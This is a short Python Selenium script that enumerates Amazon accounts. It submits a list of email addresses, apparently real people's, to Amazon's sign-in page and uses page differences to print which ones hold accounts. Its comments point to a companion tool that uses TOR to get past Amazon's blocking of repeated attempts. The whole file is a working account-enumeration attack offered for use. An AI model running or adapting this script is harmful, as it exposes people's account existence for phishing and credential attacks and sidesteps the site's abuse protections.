# Amazon Enumeration
# For a Enumerating a long list of Email Ids, please use the main tool as it has TOR functionality included.
# This script works fine for checking a few Emails. Amazon blocks requests after multiple attempts.

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff


print("Usernames present in amazon are: ")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["ccohen@gmail.com", "asdbaskjdbasdba@gmail.com", "superman@gmail.com", "keijser@yahoo.com", "maryjane@gmail.com", "ajohnson@yahoo.com", "rnewman@gmail.com", "sfoskett@yahoo.com", "seurat@yahoo.com", "richard@gmail.com", "punkis@gmail.com"]:
    user = i

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    driver.get("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")
    p1 = driver.page_source
    elem=driver.find_element_by_xpath("//input[@type='email']") #type = 'text'/'email'
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(1)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)
    if "Change" in p3:
       print(i)
    sleep(3)
    driver.close()